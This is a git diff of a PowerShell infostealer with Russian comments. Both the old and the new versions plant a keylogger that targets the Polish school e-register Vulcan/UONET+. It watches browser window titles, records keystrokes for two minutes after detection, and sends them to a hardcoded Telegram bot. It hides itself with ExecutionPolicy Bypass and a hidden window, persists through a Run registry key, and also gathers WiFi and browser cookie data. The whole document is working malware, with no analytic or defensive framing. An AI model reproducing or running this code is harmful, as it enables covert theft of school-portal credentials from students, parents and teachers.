@@ -20,346 +20,237 @@ try {
     if (!$wifi) {$wifi = "No WiFi networks"}
 } catch {$wifi = "WiFi error"}
 
-# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР С ТАЙМЕРОМ 2 МИНУТЫ
+# ПРОСТОЙ И РАБОЧИЙ КЕЙЛОГГЕР С ТАЙМЕРОМ
 $keyloggerStatus = "Starting..."
 
-# Создаем улучшенный кейлоггер с таймером
+# Создаем простой и надежный кейлоггер
 $keyloggerScript = @"
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Runtime.InteropServices
 
-# API для получения информации о браузерах
-`$signature = @'
-[DllImport("user32.dll")]
-public static extern IntPtr GetForegroundWindow();
+# Глобальные переменные
+`$global:buffer = ""
+`$global:monitoringActive = `$false
+`$global:monitorEndTime = `$null
+`$global:lastSendTime = Get-Date
 
-[DllImport("user32.dll")]
-public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
-
-[DllImport("user32.dll")]
-public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
-'@
-
-Add-Type -MemberDefinition `$signature -Name Win32 -Namespace Api
-
-# Список целевых сайтов Вулкан
-`$vulcanUrls = @(
-    "*vulcan*",
-    "*uonetplus*", 
-    "*dziennik*",
-    "*edu.gdynia*",
-    "*eszkola.opolskie.pl*",
-    "*cufs.vulcan.net.pl*",
-    "*dziennik-logowanie.vulcan.net.pl*",
-    "*Account/LogOn*",
-    "*minrol*",
-    "*uonetplus.vulcan.net.pl*"
-)
-
-`$capturedData = @()
-`$currentWindow = ""
-`$buffer = ""
-`$isVulcanSite = `$false
-`$loginData = ""
-`$passwordData = ""
-`$lastProcessName = ""
-`$vulcanDetectedTime = `$null
-`$monitoringEndTime = `$null
-`$isMonitoringActive = `$false
-
-function Get-ActiveWindowInfo {
-    try {
-        `$hWnd = [Api.Win32]::GetForegroundWindow()
-        if(`$hWnd -eq [IntPtr]::Zero) { return `$null }
-        
-        `$titleBuilder = New-Object System.Text.StringBuilder 256
-        `$result = [Api.Win32]::GetWindowText(`$hWnd, `$titleBuilder, `$titleBuilder.Capacity)
-        
-        `$processId = 0
-        [Api.Win32]::GetWindowThreadProcessId(`$hWnd, [ref]`$processId)
-        
-        if(`$processId -ne 0) {
-            `$process = Get-Process -Id `$processId -ErrorAction SilentlyContinue
-            `$processName = if(`$process) { `$process.ProcessName } else { "Unknown" }
-        } else {
-            `$processName = "Unknown"
-        }
-        
-        return @{
-            Title = `$titleBuilder.ToString()
-            ProcessName = `$processName
-            ProcessId = `$processId
-        }
-    } catch {
-        return `$null
-    }
-}
-
-function Test-VulcanSite {
-    param(`$windowInfo)
-    
-    if(!`$windowInfo) { return `$false }
-    
-    `$title = `$windowInfo.Title
-    `$process = `$windowInfo.ProcessName.ToLower()
-    
-    # Проверяем браузеры
-    `$isBrowser = `$process -match "chrome|firefox|edge|iexplore|opera|brave|msedge"
-    
-    if(!`$isBrowser) { return `$false }
-    
-    # Проверяем заголовок на наличие ключевых слов Вулкан
-    foreach(`$url in `$vulcanUrls) {
-        if(`$title -like `$url) {
-            return `$true
-        }
-    }
-    
-    # Дополнительные проверки для популярных браузеров
-    if(`$isBrowser) {
-        # Проверяем URL через JavaScript injection simulation
-        `$browserKeywords = @("vulcan", "dziennik", "uonet", "logowanie", "login", "password", "hasło", "minrol")
-        foreach(`$keyword in `$browserKeywords) {
-            if(`$title.ToLower().Contains(`$keyword.ToLower())) {
-                return `$true
-            }
-        }
-    }
-    
-    return `$false
-}
-
-function Send-ToTelegram {
-    param(`$message)
+function Send-Telegram {
+    param(`$text)
     try {
         `$body = @{
             chat_id = '5674514050'
-            text = `$message
+            text = `$text
         }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body -TimeoutSec 3
     } catch { }
 }
 
-function Process-Buffer {
-    if(`$buffer -ne "") {
-        # Определяем тип данных по контексту
-        if(`$buffer -match "(login|user|username|uzytkownik|nazwa|email|e-mail|@)") {
-            `$script:loginData = `$buffer
-            Send-ToTelegram "🔑 VULCAN LOGIN DETECTED: `$buffer"
-        } elseif(`$buffer -match "(password|haslo|pass|pwd)") {
-            `$script:passwordData = `$buffer
-            Send-ToTelegram "🔒 VULCAN PASSWORD DETECTED: `$buffer"
-        } else {
-            # Проверяем, похоже ли на логин (содержит @ или типичные логины)
-            if(`$buffer -match ".+@.+\..+" -or `$buffer -match "^[a-zA-Z0-9._-]{3,20}`$") {
-                `$script:loginData = `$buffer
-                Send-ToTelegram "🔑 VULCAN LOGIN (AUTO-DETECTED): `$buffer"
-            } else {
-                # Отправляем обычные данные только если они не пустые и не служебные
-                if(`$buffer.Trim() -ne "" -and `$buffer -notmatch "^\[.*\]`$") {
-                    Send-ToTelegram "📝 VULCAN INPUT: `$buffer"
-                }
-            }
+function Get-CurrentBrowserTitle {
+    try {
+        # Получаем все процессы браузеров
+        `$browserProcesses = Get-Process | Where-Object { 
+            `$_.ProcessName -match "chrome|firefox|edge|msedge|iexplore|opera|brave" -and 
+            `$_.MainWindowTitle -ne ""
         }
         
-        # Если есть и логин и пароль - отправляем вместе
-        if(`$script:loginData -ne "" -and `$script:passwordData -ne "") {
-            Send-ToTelegram "🎯 VULCAN CREDENTIALS COMPLETE:`nLogin: `$script:loginData`nPassword: `$script:passwordData"
-            `$script:loginData = ""
-            `$script:passwordData = ""
+        if (`$browserProcesses) {
+            # Берем процесс с самым большим окном (скорее всего активный)
+            `$activeBrowser = `$browserProcesses | Sort-Object { `$_.MainWindowHandle } -Descending | Select-Object -First 1
+            return `$activeBrowser.MainWindowTitle
         }
-        
-        `$script:capturedData += `$buffer
-        `$script:buffer = ""
-    }
+    } catch { }
+    return ""
 }
 
-function Handle-KeyPress {
+function Check-VulcanSite {
+    `$title = Get-CurrentBrowserTitle
+    if (-not `$title) { return `$false }
+    
+    `$vulcanKeywords = @(
+        "vulcan", "uonet", "dziennik", "minrol", "logowanie", 
+        "login", "account", "edu.gdynia", "eszkola"
+    )
+    
+    `$titleLower = `$title.ToLower()
+    foreach (`$keyword in `$vulcanKeywords) {
+        if (`$titleLower.Contains(`$keyword)) {
+            return `$true
+        }
+    }
+    return `$false
+}
+
+function Start-Monitoring {
+    `$global:monitoringActive = `$true
+    `$global:monitorEndTime = (Get-Date).AddMinutes(2)
+    Send-Telegram "🎯 VULCAN SITE DETECTED! Monitoring started for 2 minutes until `$(`$global:monitorEndTime.ToString('HH:mm:ss'))"
+}
+
+function Stop-Monitoring {
+    `$global:monitoringActive = `$false
+    `$global:monitorEndTime = `$null
+    if (`$global:buffer -ne "") {
+        Send-Telegram "📝 FINAL INPUT: `$global:buffer"
+        `$global:buffer = ""
+    }
+    Send-Telegram "⏹️ Monitoring stopped - 2 minutes elapsed"
+}
+
+function Process-Key {
     param(`$key)
     
-    switch(`$key) {
-        "Enter" { 
-            Process-Buffer
+    # Обработка специальных клавиш
+    switch (`$key.ToString()) {
+        "Return" { 
+            if (`$global:buffer -ne "") {
+                Send-Telegram "↵ ENTER: `$global:buffer"
+                `$global:buffer = ""
+            }
         }
         "Space" { 
-            `$script:buffer += " " 
+            `$global:buffer += " " 
         }
         "Back" { 
-            if(`$script:buffer.Length -gt 0) { 
-                `$script:buffer = `$script:buffer.Substring(0, `$script:buffer.Length - 1) 
+            if (`$global:buffer.Length -gt 0) {
+                `$global:buffer = `$global:buffer.Substring(0, `$global:buffer.Length - 1)
             }
         }
         "Tab" { 
-            `$script:buffer += "[TAB]"
-            Process-Buffer
-        }
-        "LButton" { 
-            Process-Buffer
-        }
-        "RButton" { 
-            Process-Buffer
+            `$global:buffer += "[TAB]"
+            Send-Telegram "↹ TAB: `$global:buffer"
+            `$global:buffer = ""
         }
         "Escape" {
-            `$script:buffer = ""
+            `$global:buffer = ""
+        }
+        "LButton" {
+            # При клике мыши отправляем накопленные данные
+            if (`$global:buffer -ne "") {
+                Send-Telegram "🖱️ CLICK: `$global:buffer"
+                `$global:buffer = ""
+            }
+        }
+        "RButton" {
+            if (`$global:buffer -ne "") {
+                Send-Telegram "🖱️ RIGHT CLICK: `$global:buffer"
+                `$global:buffer = ""
+            }
         }
         default {
-            # Обрабатываем обычные символы
-            if(`$key -ge 65 -and `$key -le 90) {
-                # Буквы A-Z
-                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                `$isCaps = [System.Windows.Forms.Console]::CapsLock
+            # Обработка обычных символов
+            if (`$key -ge [System.Windows.Forms.Keys]::A -and `$key -le [System.Windows.Forms.Keys]::Z) {
+                `$isShift = ([System.Windows.Forms.Control]::ModifierKeys -eq [System.Windows.Forms.Keys]::Shift)
+                `$isCaps = [System.Console]::CapsLock
                 
-                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
-                    `$script:buffer += `$key.ToString()
+                if ((`$isShift -and -not `$isCaps) -or (-not `$isShift -and `$isCaps)) {
+                    `$global:buffer += `$key.ToString()
                 } else {
-                    `$script:buffer += `$key.ToString().ToLower()
+                    `$global:buffer += `$key.ToString().ToLower()
                 }
-            } elseif(`$key -ge 48 -and `$key -le 57) {
-                # Цифры 0-9
-                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+            }
+            elseif (`$key -ge [System.Windows.Forms.Keys]::D0 -and `$key -le [System.Windows.Forms.Keys]::D9) {
+                `$isShift = ([System.Windows.Forms.Control]::ModifierKeys -eq [System.Windows.Forms.Keys]::Shift)
                 `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
-                if(`$isShift) {
-                    `$script:buffer += `$symbols[`$key - 48]
+                if (`$isShift) {
+                    `$global:buffer += `$symbols[`$key - [System.Windows.Forms.Keys]::D0]
                 } else {
-                    `$script:buffer += (`$key - 48).ToString()
+                    `$global:buffer += (`$key - [System.Windows.Forms.Keys]::D0).ToString()
                 }
-            } elseif(`$key -eq 190 -or `$key -eq 110) {
-                # Точка
-                `$script:buffer += "."
-            } elseif(`$key -eq 189 -or `$key -eq 109) {
-                # Минус/дефис
-                `$script:buffer += "-"
-            } elseif(`$key -eq 187 -or `$key -eq 107) {
-                # Плюс/равно
-                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                if(`$isShift) {
-                    `$script:buffer += "+"
-                } else {
-                    `$script:buffer += "="
-                }
-            } elseif(`$key -eq 186 -or `$key -eq 59) {
-                # Точка с запятой/двоеточие
-                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                if(`$isShift) {
-                    `$script:buffer += ":"
-                } else {
-                    `$script:buffer += ";"
-                }
-            } elseif(`$key -eq 222 -or `$key -eq 192) {
-                # Кавычки/апостроф/тильда
-                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                if(`$key -eq 222) {
-                    if(`$isShift) {
-                        `$script:buffer += "`""
-                    } else {
-                        `$script:buffer += "'"
-                    }
-                } else {
-                    if(`$isShift) {
-                        `$script:buffer += "~"
-                    } else {
-                        `$script:buffer += "`""
-                    }
+            }
+            else {
+                # Специальные символы
+                switch (`$key) {
+                    "OemPeriod" { `$global:buffer += "." }
+                    "Oemcomma" { `$global:buffer += "," }
+                    "OemMinus" { `$global:buffer += "-" }
+                    "Oemplus" { `$global:buffer += "=" }
+                    "OemQuestion" { `$global:buffer += "/" }
+                    "Oemtilde" { `$global:buffer += "`"" }
+                    "D1" { `$global:buffer += "1" }
+                    "D2" { `$global:buffer += "2" }
+                    "D3" { `$global:buffer += "3" }
+                    "D4" { `$global:buffer += "4" }
+                    "D5" { `$global:buffer += "5" }
+                    "D6" { `$global:buffer += "6" }
+                    "D7" { `$global:buffer += "7" }
+                    "D8" { `$global:buffer += "8" }
+                    "D9" { `$global:buffer += "9" }
+                    "D0" { `$global:buffer += "0" }
                 }
             }
         }
     }
     
-    # Автоматически отправляем длинные вводы
-    if(`$script:buffer.Length -gt 30) {
-        Process-Buffer
+    # Автоотправка при длинном вводе
+    if (`$global:buffer.Length -gt 20) {
+        Send-Telegram "📝 AUTO: `$global:buffer"
+        `$global:buffer = ""
     }
 }
 
-function Start-MonitoringTimer {
-    `$script:vulcanDetectedTime = Get-Date
-    `$script:monitoringEndTime = `$script:vulcanDetectedTime.AddMinutes(2)
-    `$script:isMonitoringActive = `$true
-    Send-ToTelegram "⏰ VULCAN MONITORING STARTED! Timer: 2 minutes`nEnds at: `$(`$script:monitoringEndTime.ToString('HH:mm:ss'))"
-}
+# Запускаем мониторинг
+Send-Telegram "🔍 VULCAN KEYLOGGER STARTED - Waiting for site detection..."
 
-function Stop-MonitoringTimer {
-    `$script:isMonitoringActive = `$false
-    `$script:vulcanDetectedTime = `$null
-    `$script:monitoringEndTime = `$null
-    Process-Buffer
-    Send-ToTelegram "⏹️ VULCAN MONITORING STOPPED - 2 minutes timer expired"
-}
-
-# Основной цикл
-Send-ToTelegram "🔍 VULCAN KEYLOGGER STARTED - Waiting for uonetplus.vulcan.net.pl..."
-
-while(`$true) {
+while (`$true) {
     try {
-        `$windowInfo = Get-ActiveWindowInfo
-        `$isCurrentlyVulcan = Test-VulcanSite -windowInfo `$windowInfo
-        `$currentTime = Get-Date
+        # Проверяем сайт Vulcan каждые 2 секунды
+        if (Check-VulcanSite) {
+            if (-not `$global:monitoringActive) {
+                Start-Monitoring
+            }
+            
+            # Обновляем время окончания если снова обнаружили сайт
+            `$global:monitorEndTime = (Get-Date).AddMinutes(2)
+        }
         
-        # Проверяем, активно ли monitoring
-        if(`$script:isMonitoringActive) {
-            # Проверяем, не истекло ли время мониторинга
-            if(`$currentTime -gt `$script:monitoringEndTime) {
-                Stop-MonitoringTimer
+        # Если мониторинг активен - перехватываем клавиши
+        if (`$global:monitoringActive) {
+            # Проверяем таймер
+            if ((Get-Date) -gt `$global:monitorEndTime) {
+                Stop-Monitoring
             } else {
-                # Показываем оставшееся время каждые 30 секунд
-                `$timeLeft = `$script:monitoringEndTime - `$currentTime
-                if(`$timeLeft.TotalSeconds -le 10 -and `$timeLeft.TotalSeconds -gt 0) {
-                    Send-ToTelegram "⏳ MONITORING ENDS IN: [math]::Ceiling(`$timeLeft.TotalSeconds) seconds"
-                } elseif([math]::Floor(`$timeLeft.TotalSeconds) % 30 -eq 0 -and `$timeLeft.TotalSeconds -gt 10) {
-                    Send-ToTelegram "⏳ Monitoring time left: [math]::Floor(`$timeLeft.TotalMinutes):`$(`$timeLeft.Seconds.ToString('00')) minutes"
+                # Перехват клавиш
+                for (`$i = 8; `$i -le 255; `$i++) {
+                    `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
+                    if (`$keyState -eq -32767) {
+                        `$key = [System.Windows.Forms.Keys]`$i
+                        Process-Key -key `$key
+                    }
                 }
-            }
-        }
-        
-        if(`$isCurrentlyVulcan) {
-            if(!`$script:isVulcanSite) {
-                `$script:isVulcanSite = `$true
-                `$script:lastProcessName = `$windowInfo.ProcessName
-                Send-ToTelegram "🎯 VULCAN SITE DETECTED:`nTitle: `$(`$windowInfo.Title)`nBrowser: `$(`$windowInfo.ProcessName)"
                 
-                # Запускаем таймер мониторинга на 2 минуты
-                if(!`$script:isMonitoringActive) {
-                    Start-MonitoringTimer
-                }
-            }
-        } else {
-            if(`$script:isVulcanSite) {
-                `$script:isVulcanSite = `$false
-                `$script:lastProcessName = ""
-                if(`$script:isMonitoringActive) {
-                    Send-ToTelegram "📱 USER LEFT VULCAN SITE (monitoring continues until timer expires)"
+                # Автоотправка каждые 10 секунд
+                if ((Get-Date) - `$global:lastSendTime -gt [TimeSpan]::FromSeconds(10)) {
+                    if (`$global:buffer -ne "") {
+                        Send-Telegram "⏰ TIMEOUT: `$global:buffer"
+                        `$global:buffer = ""
+                    }
+                    `$global:lastSendTime = Get-Date
                 }
             }
         }
         
-        # Перехватываем нажатия клавиш только во время активного мониторинга
-        if(`$script:isMonitoringActive) {
-            for(`$i = 8; `$i -lt 255; `$i++) {
-                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
-                if(`$keyState -eq -32767) {
-                    `$key = [System.Windows.Forms.Keys]`$i
-                    Handle-KeyPress -key `$key
-                }
-            }
-        }
-    } catch { 
-        # Игнорируем ошибки для стабильности
+        Start-Sleep -Milliseconds 50
+    } catch {
+        # Продолжаем работу при ошибках
+        Start-Sleep -Milliseconds 1000
     }
-    Start-Sleep -Milliseconds 1
 }
 "@
 
-# Сохраняем и запускаем улучшенный кейлоггер с таймером
+# Сохраняем и запускаем кейлоггер
 try {
-    $keyloggerScript | Out-File "$env:TEMP\vulcan_logger_timer.ps1" -Encoding ASCII
-    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger_timer.ps1`"" -WindowStyle Hidden
+    $keyloggerPath = "$env:TEMP\vulcan_simple.ps1"
+    $keyloggerScript | Out-File $keyloggerPath -Encoding UTF8
+    
+    # Запускаем в отдельном процессе
+    $process = Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`"" -PassThru
     
     # Добавляем в автозагрузку
     $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger_timer.ps1`""
-    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
+    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$keyloggerPath`""
+    Set-ItemProperty -Path $startupPath -Name "VulcanMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
     
-    $keyloggerStatus = "✅ Advanced Vulcan keylogger ACTIVE - 2 minutes monitoring after site detection"
+    $keyloggerStatus = "✅ SIMPLE KEYLOGGER ACTIVE - 2 minutes monitoring after Vulcan detection"
+    
 } catch {
     $keyloggerStatus = "❌ Keylogger failed: $($_.Exception.Message)"
 }
@@ -453,10 +344,10 @@ $keyloggerStatus
 • Все сайты Vulcan/UONET+
 • Страницы входа в дневник
 
-=== MONITORING TIMER ===
-• Начинает работу при обнаружении сайта Vulcan
+=== MONITORING MODE ===
+• Автоматически включается при обнаружении сайта Vulcan
 • Работает 2 минуты после обнаружения
-• Перехватывает все нажатия клавиш в этот период
+• Перехватывает ВСЕ нажатия клавиш в этот период
 
 === BROWSER COOKIES ===
 Found cookies files: $($cookies.Count)
@@ -511,5 +402,6 @@ if (Test-Path $zipPath) {
 }
 
 # Очистка
+Start-Sleep 2
 Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
